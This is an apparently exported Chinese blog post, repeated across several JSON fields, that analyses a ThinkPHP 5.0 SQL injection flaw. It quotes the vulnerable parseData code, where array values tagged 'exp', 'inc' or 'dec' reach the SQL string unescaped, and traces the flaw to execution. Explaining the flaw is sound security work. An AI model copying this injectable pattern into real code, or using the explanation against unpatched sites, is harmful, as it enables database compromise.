exists:[' . $key . ']');\n            }\n        } elseif (is_null($val)) {\n            $result[$item] = 'NULL';\n        } elseif (is_array($val) &amp;&amp; !empty($val)) {\n    \n            switch ($val[0]) {\n    \n                case 'exp':\n                    $result[$item]= $val[1] . '+' . floatval($val[2]);\n                    break;\n                case 'inc':\n                    $result[$item]= $this-&gt;parseKey($val[1]) . '+' . floatval($val[2]);\n                    break;\n                case 'dec':\n                    $result[$item]= $this-&gt;parseKey($val[1]) . '-' . floatval($val[2]);\n                    break;\n            }\n        } elseif (is_scalar($val)) {\n            // 过滤非标量数据\n            if (0 === strpos($val, ':') &amp;&amp;$this-&gt;query-&gt;isBind(substr($val, 1))) {\n                $result[$item] = $val;\n            } else {\n                $key = str_replace('.', '_', $key);\n                $this-&gt;query-&gt;bind('data__' . $key, $val, isset($bind[$key])? $bind[$key]: PDO::PARAM_STR);\n                $result[$item] = ':data__' . $key;\n            }\n        }\n    }\n    return $result;\n}\n</pre>\n可以看出这个方法是用来传入的字典类型$data数据的，具体传入的$data是什么，还需要进一步分析。\n\n先不管调用关系，单单看这个方法，在处理$data的value时，会分情况处理，\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/5-10.png)\n\n是否是空，是否是数组，是否是常量，而漏洞恰恰出在了是否是数组这个elseif上了。\n\n接下来看看谁调用了parseData，传入的$data又是什么。\n\n向上跟踪到Builder.php中的insert方法\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/6-10.png)\n\n这个insert也不是最上层，但我们就先看看这个insert做了什么。\n\n假如最上层入口的$data我们可控，$data这个字典中的value值还是个数组，那个经过parseData方法后，最终的返回值就可控，原因如下：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/7-7.png)\n\n只要$val[0]的值是exp/inc或者是dec，那么我们就能将$val[1]恶意构造的值传入$result[$item]中，这个$result值最终会返回给insert方法中的$data变量，看下图：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/8-7.png)\n\n并且，最终$fields的值会是$item的值;$values的值会是$result[$item]的值，即为\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/9-6.png)\n\n不要担心这个parseKey方法会破坏我们构造的$val[1],因为。。。。\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/10-6.png)\n\n到目前为止，我们的推断是，只要$data的值可控，那么我们就能将恶意构造的值传入$values这个参数。接下来，看看$values这个可控参数又如何造成sql注入的。\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/11-5.png)\n\n很明显，这里是要拼接sql语句了，最终的$values会被拼接到$sql变量中\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/12-5.png)\n\n抛开恶意构造的部分，有经验的朋友一看就能想到这个$sql变量是要做什么的。对，这个$sql变量是要用作参数化查询的sql指令部分。\n\n为了验证我们的猜想，继续往上层跟踪。\n\n在\\library\\think\\db\\Query.php中，调用了我们刚才分析的builder中的insert方法\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/13-4.png)\n\n刚才的$sql变量，这次又传递给了Query.php中的$sql变量了，这里的$bind，实际上就是用来取出真是value值的。\n\n然后在上图红圈中，使用execute进行参数化查询。由于$sql变量可控，里面可以包含我们传入的恶意字符串，因此，即使用了参数化查询，也没法避免sql注入的产生。\n\n这个漏洞怎么利用呢？这关系的Query.php中的这个insert方法，看看thinkphp中关于这个方法的使用说明\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/14-4.png)\n\n我这里给个demo，帮助大家理解下应用场景。\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/15-4.png)\n\n## **总结**\n\n理论上来说，利用参数化查询，将要执行的sql语句和参数分开传入，的确可以防止sql注入的产生。但是像这个案例，要执行的sql语句中的内容竟然可控，那就比较尴尬了。\n\n## **思考**\n\n漏洞分析虽然告一段落了，这里我给大家提出几个问题，看看大家有没有真的弄明白这个漏洞。\n\n1.  如果我直接通过get方法传入一个字符串，这个漏洞会利用成功吗？\n2.  最终的修补如下图\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/16-4.png)\n\n当$val[0]=exp的时候，$val[1]仍然可控，并且也传入了$result[$item]里了，这里是否还是有漏洞呢？为什么thinkphp不修这里呢？\n\n**答案**\n\n*   get传入的值如果是一个字符串，最终会到如下这里\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/17-4.png)\n\n最终的$result[$item]中的$key值是不可控的，\n\n对于我给出的那个例子\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/18-3.png)\n\n$key就是红圈中的内容\n\n因此最终执行时，$sql不可控，还利用了参数化查询，完全没有注入的可能，如下图\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/19-2.png)\n\n&nbsp;\n\n**答案2**\n\n这个问题也困扰到我了，找到这个问题的时间简直比分析漏洞的时间还长。\n\n通过Input方法传入的变量，会中途经过\\library\\think\\Request.php中的input方法进行处理，然而在这个方法中，有一个过滤器。。。\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/20-2.png)\n\n如果$data是数组形式的，就利用$this-&gt;filterValue进行处理\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/21-2.png)\n\n这个过滤器还没对我们的$data下手，注意看红框处，filterExp\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/22-2.png)\n\n在这里，filterExp如果匹配到了exp，则会给它后面加一个空格，这就导致了我们通过get/post\n\n提交进来的数组中，如果有exp，则会被处理为“exp ”，因此无法进入”exp”这个case\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/23-2.png)","source":"_posts/thinkphp-5-0-sql.md","raw":"---\ntitle: ThinkPHP 5.0版本 SQL注入漏洞分析\ndate: 2018-04-18 15:36:50\ntags: web漏洞分析\ncategories: 技术\n\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\n前段时间，ThinkPHP发布了V5.0.16版本的release，该版本提到了安全更新。本篇文章以此次安全更新入手，对ThinkPHP 5.0版本 SQL注入漏洞进行了详细分析。文末还有测试小问题，看看大家get到这个漏洞的精髓了吗？\n\n<!--more-->\n\n## 前言\n\nThinkphp V5.0.16版本的release说明如下：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/图片-1-8.png)\n\n说明中提到了安全更新，但并没有提到是什么安全问题。\n\nV5.0.16的commits记录如下，可以看到在3月26日出现了一个关于安全性的提交，但26日似乎没有一次性改好，在27日又对这个inc/dec查询改动了一次\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/2-11.png)\n\n接下来看下这个inc/dec查询到底有什么问题，需要一改再改。\n\n## **漏洞分析**\n\n先看下26日改了什么\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/3-11.png)\n\n再看看27日改了什么\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/4-10.png)\n\n改动都在Builder.php这个文件的相同位置，而且反反复复的折腾的，就是$val[1]这个变量。\n\n接下来看看完整的函数部分，看看$val[1]到底怎么了。\n\n漏洞部分在parseData函数\n<pre class=\"lang:default decode:true\">protected function parseData($data, $options)\n{\n    if (empty($data)) {\n        return [];\n    }\n\n    // 获取绑定信息\n    $bind = $this-&gt;query-&gt;getFieldsBind($options['table']);\n    if ('*' == $options['field']) {\n        $fields = array_keys($bind);\n    } else {\n        $fields = $options['field'];\n    }\n    \n    $result = [];\n    foreach ($data as $key =&gt; $val) {\n        $item = $this-&gt;parseKey($key, $options);\n        if (is_object($val) &amp;&amp;method_exists($val, '__toString')) {\n            // 对象数据写入\n            $val = $val-&gt;__toString();\n        }\n        if (false === strpos($key, '.') &amp;&amp; !in_array($key, $fields, true)) {\n            if ($options['strict']) {\n                throw new Exception('fields not exists:[' . $key . ']');\n            }\n        } elseif (is_null($val)) {\n            $result[$item] = 'NULL';\n        } elseif (is_array($val) &amp;&amp; !empty($val)) {\n    \n            switch ($val[0]) {\n    \n                case 'exp':\n                    $result[$item]= $val[1] . '+' . floatval($val[2]);\n                    break;\n                case 'inc':\n                    $result[$item]= $this-&gt;parseKey($val[1]) . '+' . floatval($val[2]);\n                    break;\n                case 'dec':\n                    $result[$item]= $this-&gt;parseKey($val[1]) . '-' . floatval($val[2]);\n                    break;\n            }\n        } elseif (is_scalar($val)) {\n            // 过滤非标量数据\n            if (0 === strpos($val, ':') &amp;&amp;$this-&gt;query-&gt;isBind(substr($val, 1))) {\n                $result[$item] = $val;\n            } else {\n                $key = str_replace('.', '_', $key);\n                $this-&gt;query-&gt;bind('data__' . $key, $val, isset($bind[$key])? $bind[$key]: PDO::PARAM_STR);\n                $result[$item] = ':data__' . $key;\n            }\n        }\n    }\n    return $result;\n}\n</pre>\n可以看出这个方法是用来传入的字典类型$data数据的，具体传入的$data是什么，还需要进一步分析。\n\n先不管调用关系，单单看这个方法，在处理$data的value时，会分情况处理，\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/5-10.png)\n\n是否是空，是否是数组，是否是常量，而漏洞恰恰出在了是否是数组这个elseif上了。\n\n接下来看看谁调用了parseData，传入的$data又是什么。\n\n向上跟踪到Builder.php中的insert方法\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/6-10.png)\n\n这个insert也不是最上层，但我们就先看看这个insert做了什么。\n\n假如最上层入口的$data我们可控，$data这个字典中的value值还是个数组，那个经过parseData方法后，最终的返回值就可控，原因如下：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/7-7.png)\n\n只要$val[0]的值是exp/inc或者是dec，那么我们就能将$val[1]恶意构造的值传入$result[$item]中，这个$result值最终会返回给insert方法中的$data变量，看下图：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/8-7.png)\n\n并且，最终$fields的值会是$item的值;$values的值会是$result[$item]的值，即为\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/9-6.png)\n\n不要担心这个parseKey方法会破坏我们构造的$val[1],因为。。。。\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/10-6.png)\n\n到目前为止，我们的推断是，只要$data的值可控，那么我们就能将恶意构造的值传入$values这个参数。接下来，看看$values这个可控参数又如何造成sql注入的。\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/11-5.png)\n\n很明显，这里是要拼接sql语句了，最终的$values会被拼接到$sql变量中\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/12-5.png)\n\n抛开恶意构造的部分，有经验的朋友一看就能想到这个$sql变量是要做什么的。对，这个$sql变量是要用作参数化查询的sql指令部分。\n\n为了验证我们的猜想，继续往上层跟踪。\n\n在\\library\\think\\db\\Query.php中，调用了我们刚才分析的builder中的insert方法\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/13-4.png)\n\n刚才的$sql变量，这次又传递给了Query.php中的$sql变量了，这里的$bind，实际上就是用来取出真是value值的。\n\n然后在上图红圈中，使用execute进行参数化查询。由于$sql变量可控，里面可以包含我们传入的恶意字符串，因此，即使用了参数化查询，也没法避免sql注入的产生。\n\n这个漏洞怎么利用呢？这关系的Query.php中的这个insert方法，看看thinkphp中关于这个方法的使用说明\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/14-4.png)\n\n我这里给个demo，帮助大家理解下应用场景。\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/15-4.png)\n\n## **总结**\n\n理论上来说，利用参数化查询，将要执行的sql语句和参数分开传入，的确可以防止sql注入的产生。但是像这个案例，要执行的sql语句中的内容竟然可控，那就比较尴尬了。\n\n## **思考**\n\n漏洞分析虽然告一段落了，这里我给大家提出几个问题，看看大家有没有真的弄明白这个漏洞。\n\n1.  如果我直接通过get方法传入一个字符串，这个漏洞会利用成功吗？\n2.  最终的修补如下图\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/16-4.png)\n\n当$val[0]=exp的时候，$val[1]仍然可控，并且也传入了$result[$item]里了，这里是否还是有漏洞呢？为什么thinkphp不修这里呢？\n\n**答案**\n\n*   get传入的值如果是一个字符串，最终会到如下这里\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/17-4.png)\n\n最终的$result[$item]中的$key值是不可控的，\n\n对于我给出的那个例子\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/18-3.png)\n\n$key就是红圈中的内容\n\n因此最终执行时，$sql不可控，还利用了参数化查询，完全没有注入的可能，如下图\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/19-2.png)\n\n&nbsp;\n\n**答案2**\n\n这个问题也困扰到我了，找到这个问题的时间简直比分析漏洞的时间还长。\n\n通过Input方法传入的变量，会中途经过\\library\\think\\Request.php中的input方法进行处理，然而在这个方法中，有一个过滤器。。。\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/20-2.png)\n\n如果$data是数组形式的，就利用$this-&gt;filterValue进行处理\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/21-2.png)\n\n这个过滤器还没对我们的$data下手，注意看红框处，filterExp\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/22-2.png)\n\n在这里，filterExp如果匹配到了exp，则会给它后面加一个空格，这就导致了我们通过get/post\n\n提交进来的数组中，如果有exp，则会被处理为“exp ”，因此无法进入”exp”这个case\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/23-2.png)","slug":"thinkphp-5-0-sql","published":1,"updated":"2020-10-27T09:27:09.909Z","_id":"ckgrozua2004vwsa9eozq3e9g","comments":1,"layout":"post","photos":[],"link":"","content":"<p>前段时间，ThinkPHP发布了V5.0.16版本的release，该版本提到了安全更新。本篇文章以此次安全更新入手，对ThinkPHP 5.0版本 SQL注入漏洞进行了详细分析。文末还有测试小问题，看看大家get到这个漏洞的精髓了吗？</p>\n<a id=\"more\"></a>\n\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>Thinkphp V5.0.16版本的release说明如下：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/%E5%9B%BE%E7%89%87-1-8.png\"></p>\n<p>说明中提到了安全更新，但并没有提到是什么安全问题。</p>\n<p>V5.0.16的commits记录如下，可以看到在3月26日出现了一个关于安全性的提交，但26日似乎没有一次性改好，在27日又对这个inc/dec查询改动了一次</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/2-11.png\"></p>\n<p>接下来看下这个inc/dec查询到底有什么问题，需要一改再改。</p>\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a><strong>漏洞分析</strong></h2><p>先看下26日改了什么</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/3-11.png\"></p>\n<p>再看看27日改了什么</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/4-10.png\"></p>\n<p>改动都在Builder.php这个文件的相同位置，而且反反复复的折腾的，就是$val[1]这个变量。</p>\n<p>接下来看看完整的函数部分，看看$val[1]到底怎么了。</p>\n<p>漏洞部分在parseData函数</p>\n<pre class=\"lang:default decode:true\">protected function parseData($data, $options)\n{\n    if (empty($data)) {\n        return [];\n    }\n\n    // 获取绑定信息\n    $bind = $this-&gt;query-&gt;getFieldsBind($options['table']);\n    if ('*' == $options['field']) {\n        $fields = array_keys($bind);\n    } else {\n        $fields = $options['field'];\n    }\n\n    $result = [];\n    foreach ($data as $key =&gt; $val) {\n        $item = $this-&gt;parseKey($key, $options);\n        if (is_object($val) &amp;&amp;method_exists($val, '__toString')) {\n            // 对象数据写入\n            $val = $val-&gt;__toString();\n        }\n        if (false === strpos($key, '.') &amp;&amp; !in_array($key, $fields, true)) {\n            if ($options['strict']) {\n                throw new Exception('fields not exists:[' . $key . ']');\n            }\n        } elseif (is_null($val)) {\n            $result[$item] = 'NULL';\n        } elseif (is_array($val) &amp;&amp; !empty($val)) {\n\n            switch ($val[0]) {\n\n                case 'exp':\n                    $result[$item]= $val[1] . '+' . floatval($val[2]);\n                    break;\n                case 'inc':\n                    $result[$item]= $this-&gt;parseKey($val[1]) . '+' . floatval($val[2]);\n                    break;\n                case 'dec':\n                    $result[$item]= $this-&gt;parseKey($val[1]) . '-' . floatval($val[2]);\n                    break;\n            }\n        } elseif (is_scalar($val)) {\n            // 过滤非标量数据\n            if (0 === strpos($val, ':') &amp;&amp;$this-&gt;query-&gt;isBind(substr($val, 1))) {\n                $result[$item] = $val;\n            } else {\n                $key = str_replace('.', '_', $key);\n                $this-&gt;query-&gt;bind('data__' . $key, $val, isset($bind[$key])? $bind[$key]: PDO::PARAM_STR);\n                $result[$item] = ':data__' . $key;\n            }\n        }\n    }\n    return $result;\n}\n</pre>\n<p>可以看出这个方法是用来传入的字典类型$data数据的，具体传入的$data是什么，还需要进一步分析。</p>\n<p>先不管调用关系，单单看这个方法，在处理$data的value时，会分情况处理，</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/5-10.png\"></p>\n<p>是否是空，是否是数组，是否是常量，而漏洞恰恰出在了是否是数组这个elseif上了。</p>\n<p>接下来看看谁调用了parseData，传入的$data又是什么。</p>\n<p>向上跟踪到Builder.php中的insert方法</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/6-10.png\"></p>\n<p>这个insert也不是最上层，但我们就先看看这个insert做了什么。</p>\n<p>假如最上层入口的$data我们可控，$data这个字典中的value值还是个数组，那个经过parseData方法后，最终的返回值就可控，原因如下：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/7-7.png\"></p>\n<p>只要$val[0]的值是exp/inc或者是dec，那么我们就能将$val[1]恶意构造的值传入$result[$item]中，这个$result值最终会返回给insert方法中的$data变量，看下图：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/8-7.png\"></p>\n<p>并且，最终$fields的值会是$item的值;$values的值会是$result[$item]的值，即为</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/9-6.png\"></p>\n<p>不要担心这个parseKey方法会破坏我们构造的$val[1],因为。。。。</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/10-6.png\"></p>\n<p>到目前为止，我们的推断是，只要$data的值可控，那么我们就能将恶意构造的值传入$values这个参数。接下来，看看$values这个可控参数又如何造成sql注入的。</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/11-5.png\"></p>\n<p>很明显，这里是要拼接sql语句了，最终的$values会被拼接到$sql变量中</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/12-5.png\"></p>\n<p>抛开恶意构造的部分，有经验的朋友一看就能想到这个$sql变量是要做什么的。对，这个$sql变量是要用作参数化查询的sql指令部分。</p>\n<p>为了验证我们的猜想，继续往上层跟踪。</p>\n<p>在\\library\\think\\db\\Query.php中，调用了我们刚才分析的builder中的insert方法</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/13-4.png\"></p>\n<p>刚才的$sql变量，这次又传递给了Query.php中的$sql变量了，这里的$bind，实际上就是用来取出真是value值的。</p>\n<p>然后在上图红圈中，使用execute进行参数化查询。由于$sql变量可控，里面可以包含我们传入的恶意字符串，因此，即使用了参数化查询，也没法避免sql注入的产生。</p>\n<p>这个漏洞怎么利用呢？这关系的Query.php中的这个insert方法，看看thinkphp中关于这个方法的使用说明</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/14-4.png\"></p>\n<p>我这里给个demo，帮助大家理解下应用场景。</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/15-4.png\"></p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a><strong>总结</strong></h2><p>理论上来说，利用参数化查询，将要执行的sql语句和参数分开传入，的确可以防止sql注入的产生。但是像这个案例，要执行的sql语句中的内容竟然可控，那就比较尴尬了。</p>\n<h2 id=\"思考\"><a href=\"#思考\" class=\"headerlink\" title=\"思考\"></a><strong>思考</strong></h2><p>漏洞分析虽然告一段落了，这里我给大家提出几个问题，看看大家有没有真的弄明白这个漏洞。</p>\n<ol>\n<li>如果我直接通过get方法传入一个字符串，这个漏洞会利用成功吗？</li>\n<li>最终的修补如下图<br><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/16-4.png\"></li>\n</ol>\n<p>当$val[0]=exp的时候，$val[1]仍然可控，并且也传入了$result[$item]里了，这里是否还是有漏洞呢？为什么thinkphp不修这里呢？</p>\n<p><strong>答案</strong></p>\n<ul>\n<li>get传入的值如果是一个字符串，最终会到如下这里<br><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/17-4.png\"></li>\n</ul>\n<p>最终的$result[$item]中的$key值是不可控的，</p>\n<p>对于我给出的那个例子</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/18-3.png\"></p>\n<p>$key就是红圈中的内容</p>\n<p>因此最终执行时，$sql不可控，还利用了参数化查询，完全没有注入的可能，如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/19-2.png\"></p>\n<p>&nbsp;</p>\n<p><strong>答案2</strong></p>\n<p>这个问题也困扰到我了，找到这个问题的时间简直比分析漏洞的时间还长。</p>\n<p>通过Input方法传入的变量，会中途经过\\library\\think\\Request.php中的input方法进行处理，然而在这个方法中，有一个过滤器。。。</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/20-2.png\"></p>\n<p>如果$data是数组形式的，就利用$this-&gt;filterValue进行处理</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/21-2.png\"></p>\n<p>这个过滤器还没对我们的$data下手，注意看红框处，filterExp</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/22-2.png\"></p>\n<p>在这里，filterExp如果匹配到了exp，则会给它后面加一个空格，这就导致了我们通过get/post</p>\n<p>提交进来的数组中，如果有exp，则会被处理为“exp ”，因此无法进入”exp”这个case</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/23-2.png\"></p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/拖库1.jpg","excerpt":"<p>前段时间，ThinkPHP发布了V5.0.16版本的release，该版本提到了安全更新。本篇文章以此次安全更新入手，对ThinkPHP 5.0版本 SQL注入漏洞进行了详细分析。文末还有测试小问题，看看大家get到这个漏洞的精髓了吗？</p>","more":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>Thinkphp V5.0.16版本的release说明如下：</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/%E5%9B%BE%E7%89%87-1-8.png\"></p>\n<p>说明中提到了安全更新，但并没有提到是什么安全问题。</p>\n<p>V5.0.16的commits记录如下，可以看到在3月26日出现了一个关于安全性的提交，但26日似乎没有一次性改好，在27日又对这个inc/dec查询改动了一次</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/2-11.png\"></p>\n<p>接下来看下这个inc/dec查询到底有什么问题，需要一改再改。</p>\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a><strong>漏洞分析</strong></h2><p>先看下26日改了什么</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/3-11.png\"></p>\n<p>再看看27日改了什么</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/4-10.png\"></p>\n<p>改动都在Builder.php这个文件的相同位置，而且反反复复的折腾的，就是$val[1]这个变量。</p>\n<p>接下来看看完整的函数部分，看看$val[1]到底怎么了。</p>\n<p>漏洞部分在parseData函数</p>\n<pre class=\"lang:default decode:true\">protected function parseData($data, $options)\n{\n    if (empty($data)) {\n        return [];\n    }\n\n    // 获取绑定信息\n    $bind = $this-&gt;query-&gt;getFieldsBind($options['table']);\n    if ('*' == $options['field']) {\n        $fields = array_keys($bind);\n    } else {\n        $fields = $options['field'];\n    }\n\n    $result = [];\n    foreach ($data as $key =&gt; $val) {\n        $item = $this-&gt;parseKey($key, $options);\n        if (is_object($val) &amp;&amp;method_exists($val, '__toString')) {\n            // 对象数据写入\n            $val = $val-&gt;__toString();\n        }\n        if (false === strpos($key, '.') &amp;&amp; !in_array($key, $fields, true)) {\n            if ($options['strict']) {\n                throw new Exception('fields not exists:[' . $key . ']');\n            }\n        } elseif (is_null($val)) {\n            $result[$item] = 'NULL';\n        } elseif (is_array($val) &amp;&amp; !empty($val)) {\n\n            switch ($val[0]) {\n\n                case 'exp':\n                    $result[$item]= $val[1] . '+' . floatval($val[2]);\n                    break;\n                case 'inc':\n                    $result[$item]= $this-&gt;parseKey($val[1]) . '+' . floatval($val[2]);\n                    break;\n                case 'dec':\n                    $result[$item]= $this-&gt;parseKey($val[1]) . '-' . floatval($val[2]);\n                    break;\n            }\n        } elseif (is_scalar($val)) {\n            // 过滤非标量数据\n            if (0 === strpos($val, ':') &amp;&amp;$this-&gt;query-&gt;isBind(substr($val, 1))) {\n                $result[$item] = $val;\n            } else {\n                $key = str_replace('.', '_', $key);\n                $this-&gt;query-&gt;bind('data__' . $key, $val, isset($bind[$key])? $bind[$key]: PDO::PARAM_STR);\n                $result[$item] = ':data__' . $key;\n            }\n        }\n    }\n    return $result;\n}\n</pre>\n<p>可以看出这个方法是用来传入的字典类型$data数据的，具体传入的$data是什么，还需要进一步分析。</p>\n<p>先不管调用关系，单单看这个方法，在处理$data的value时，会分情况处理，</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/5-10.png\"></p>\n<p>是否是空，是否是数组，是否是常量，而漏洞恰恰出在了是否是数组这个elseif上了。</p>\n<p>接下来看看谁调用了parseData，传入的$data又是什么。</p>\n<p>向上跟踪到Builder.php中的insert方法</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/6-10.png\"></p>\n<p>这个insert也不是最上层，但我们就先看看这个insert做了什么。</p>\n<p>假如最上层入口的$data我们可控，$data这个字典中的value值还是个数组，那个经过parseData方法后，最终的返回值就可控，原因如下：</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/7-7.png\"></p>\n<p>只要$val[0]的值是exp/inc或者是dec，那么我们就能将$val[1]恶意构造的值传入$result[$item]中，这个$result值最终会返回给insert方法中的$data变量，看下图：</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/8-7.png\"></p>\n<p>并且，最终$fields的值会是$item的值;$values的值会是$result[$item]的值，即为</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/9-6.png\"></p>\n<p>不要担心这个parseKey方法会破坏我们构造的$val[1],因为。。。。</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/10-6.png\"></p>\n<p>到目前为止，我们的推断是，只要$data的值可控，那么我们就能将恶意构造的值传入$values这个参数。接下来，看看$values这个可控参数又如何造成sql注入的。</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/11-5.png\"></p>\n<p>很明显，这里是要拼接sql语句了，最终的$values会被拼接到$sql变量中</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/12-5.png\"></p>\n<p>抛开恶意构造的部分，有经验的朋友一看就能想到这个$sql变量是要做什么的。对，这个$sql变量是要用作参数化查询的sql指令部分。</p>\n<p>为了验证我们的猜想，继续往上层跟踪。</p>\n<p>在\\library\\think\\db\\Query.php中，调用了我们刚才分析的builder中的insert方法</p>\n<p><img 